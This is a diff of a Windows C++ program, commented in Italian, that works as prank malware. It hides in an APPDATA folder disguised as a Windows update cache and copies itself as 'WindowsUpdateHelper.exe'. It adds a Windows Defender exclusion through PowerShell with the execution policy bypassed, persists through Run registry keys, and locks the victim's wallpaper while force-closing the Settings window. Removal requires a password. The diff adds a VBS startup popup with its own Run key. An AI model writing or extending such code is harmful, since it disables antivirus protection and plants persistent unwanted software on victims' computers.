@@ -1,31 +1,39 @@
 #include <windows.h>
 #include <iostream>
 #include <string>
-#include <cstdio> // per sprintf_s
+#include <cstdio> 
 #include "resource.h"
+
 #pragma comment(lib, "user32.lib")
+
 // ====================== DICHIARAZIONI DELLE FUNZIONI ======================
 std::string GetHiddenFolderPath();
 std::string GetHiddenExePath();
+
 void CreateHiddenExcludedFolder();
 bool SelfCopyToHiddenFolder();
 void AddToStartupHidden();
+void AddStartupMessage();
 void RemoveVirus();
 void CheckPassword();
 void SetEmbeddedWallpaper();
 void LockWallpaper();
+
 // ====================== CONFIGURAZIONE PERCORSI ======================
 const char* HIDDEN_FOLDER_NAME = "\\Microsoft\\Windows\\UpdateCache";
 const char* HIDDEN_EXE_NAME = "WindowsUpdateHelper.exe";
+
 std::string GetHiddenFolderPath() {
     char path[MAX_PATH] = { 0 };
     GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
     strcat_s(path, HIDDEN_FOLDER_NAME);
     return std::string(path);
 }
+
 std::string GetHiddenExePath() {
     return GetHiddenFolderPath() + "\\" + HIDDEN_EXE_NAME;
 }
+
 // ====================== CREA CARTELLA NASCOSTA + ESCLUSIONE DEFENDER ======================
 void CreateHiddenExcludedFolder() {
     std::string folderPath = GetHiddenFolderPath();
@@ -36,15 +44,15 @@ void CreateHiddenExcludedFolder() {
         std::cout << "[-] Errore creazione cartella" << std::endl;
         return;
     }
-    // Rendi nascosta + system
     std::string attribCmd = "attrib +H +S \"" + folderPath + "\"";
     system(attribCmd.c_str());
     std::cout << "[+] Cartella resa nascosta (+H +S)" << std::endl;
-    // Escludi da Windows Defender
+
     std::string psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '" + folderPath + "' -Force\"";
     system(psCmd.c_str());
     std::cout << "ok ok..." << std::endl;
 }
+
 // ====================== COPIA SE STESSO NELLA CARTELLA NASCOSTA ======================
 bool SelfCopyToHiddenFolder() {
     char currentExe[MAX_PATH] = { 0 };
@@ -59,6 +67,7 @@ bool SelfCopyToHiddenFolder() {
         return false;
     }
 }
+
 // ====================== AGGIORNA REGISTRO PER USARE LA COPIA NASCOSTA ======================
 void AddToStartupHidden() {
     HKEY hKey;
@@ -71,9 +80,41 @@ void AddToStartupHidden() {
         std::cout << "i am steel here" << std::endl;
     }
 }
+
+// ====================== MESSAGGIO ALL'AVVIO DI WINDOWS (TechDom) ======================
+void AddStartupMessage() {
+    std::string hiddenFolder = GetHiddenFolderPath();
+    std::string vbsPath = hiddenFolder + "\\WelcomeMessage.vbs";
+
+    // Messaggio semplice come hai chiesto
+    std::string vbsContent =
+        "MsgBox \"i am still here\", "
+        "0 + 48 + 4096, \"System Control\"";
+
+    HANDLE hFile = CreateFileA(vbsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        DWORD written = 0;
+        WriteFile(hFile, vbsContent.c_str(), (DWORD)vbsContent.length(), &written, NULL);
+        CloseHandle(hFile);
+
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+
+            std::string cmd = "wscript.exe \"" + vbsPath + "\"";
+            RegSetValueExA(hKey, "SystemWelcome", 0, REG_SZ,
+                (const BYTE*)cmd.c_str(), (DWORD)(cmd.length() + 1));
+            RegCloseKey(hKey);
+
+            std::cout << "[+] Messaggio TechDom all'avvio configurato" << std::endl;
+        }
+    }
+}
+
 // ====================== RIMUOVI VIRUS ======================
 void RemoveVirus() {
     std::cout << "[*] removing bad stuff...\n";
+
     // 1. Sblocca il wallpaper
     HKEY hKey;
     const char* subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop";
@@ -82,21 +123,36 @@ void RemoveVirus() {
         RegSetValueExA(hKey, "NoChangingWallPaper", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
         RegCloseKey(hKey);
     }
-    // 2. Rimuove dal Run
+
+    // 2. Rimuove la persistenza dell'exe
     HKEY hKeyRun;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
         0, KEY_SET_VALUE, &hKeyRun) == ERROR_SUCCESS) {
         RegDeleteValueA(hKeyRun, "WallpaperLock");
         RegCloseKey(hKeyRun);
     }
-    // 3. Preparazione pulizia aggressiva
+
+    // 3. Rimuove il messaggio all'avvio
+    HKEY hKeyMsg;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_SET_VALUE, &hKeyMsg) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKeyMsg, "SystemWelcome");
+        RegCloseKey(hKeyMsg);
+        std::cout << "[+] Messaggio all'avvio rimosso" << std::endl;
+    }
+
+    // 4. Pulizia finale
     char exePath[MAX_PATH] = { 0 };
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
     std::string hiddenFolder = GetHiddenFolderPath();
+
     char batPath[MAX_PATH] = { 0 };
     GetTempPathA(MAX_PATH, batPath);
     strcat_s(batPath, "cleanup.bat");
+
     HANDLE hFile = CreateFileA(batPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
     char batContent[2048] = { 0 };
     sprintf_s(batContent,
         "@echo off\n"
@@ -106,16 +162,21 @@ void RemoveVirus() {
         "timeout /t 2 /nobreak >nul\n"
         "del /f /q \"%%~f0\" >nul 2>&1\n",
         exePath, hiddenFolder.c_str());
+
     DWORD written = 0;
     WriteFile(hFile, batContent, (DWORD)strlen(batContent), &written, NULL);
     CloseHandle(hFile);
+
     ShellExecuteA(NULL, "open", batPath, NULL, NULL, SW_HIDE);
+
     std::cout << "[+] bye bye!\n";
     std::cout << " → Wallpaper controll gived back\n";
     std::cout << " → bad stuff eliminated\n" << std::endl;
+
     Sleep(1500);
     exit(0);
 }
+
 // ====================== ALTRE FUNZIONI ======================
 void CheckPassword() {
     std::string input;
@@ -128,6 +189,7 @@ void CheckPassword() {
         std::cout << "Password errata!" << std::endl;
     }
 }
+
 void SetEmbeddedWallpaper() {
     HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCE(IDR_MYIMAGE), "IMAGE");
     if (!hRes) {
@@ -147,22 +209,21 @@ void SetEmbeddedWallpaper() {
     SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, savePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
     std::cout << "new wallpaper!!" << std::endl;
 }
+
 void LockWallpaper() {
     std::cout << "[*] Tentativo di bloccare il wallpaper...\n";
 
-    // 1. Prova a chiudere la finestra delle Impostazioni di Windows
     HWND hwnd = FindWindowA("ApplicationFrameWindow", "Impostazioni");
     if (hwnd) {
         PostMessageA(hwnd, WM_CLOSE, 0, 0);
-        Sleep(300);  // aspetta un po' che si chiuda
+        Sleep(300);
         std::cout << "[+] Finestra Impostazioni chiusa forzatamente" << std::endl;
     }
 
-    // 2. Blocca la policy (più volte per sicurezza)
     HKEY hKey;
     const char* subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop";
 
-    for (int i = 0; i < 3; i++) {   // prova 3 volte
+    for (int i = 0; i < 3; i++) {
         LONG openRes = RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL,
             REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
 
@@ -174,39 +235,41 @@ void LockWallpaper() {
         Sleep(150);
     }
 
-    // 3. Forza l'aggiornamento del desktop
     SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-
     std::cout << "Wallpaper locked!" << std::endl;
 }
+
 // ====================== MAIN ======================
 int main() {
-    // Controlla se è già installato
     HKEY hKey;
     LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
         0, KEY_QUERY_VALUE, &hKey);
+
     char value[MAX_PATH] = { 0 };
     DWORD size = MAX_PATH;
     LONG check = RegQueryValueExA(hKey, "WallpaperLock", NULL, NULL, (LPBYTE)value, &size);
     RegCloseKey(hKey);
+
     if (check == ERROR_SUCCESS) {
-        // Già installato → chiedi password per rimuoverlo
         CheckPassword();
     }
     else {
-        // === PRIMA INSTALLAZIONE ===
         std::cout << "[*] dowloading...\n";
+
         CreateHiddenExcludedFolder();
         SelfCopyToHiddenFolder();
         AddToStartupHidden();
+        AddStartupMessage();           // Messaggio all'avvio
         SetEmbeddedWallpaper();
         LockWallpaper();
+
         std::cout << "\n[!] i am in!\n";
         std::cout << " → bad stuff created\n";
         std::cout << " → i am in x2\n";
         std::cout << " → evrything done\n" << std::endl;
     }
+
     system("pause");
     return 0;
 }
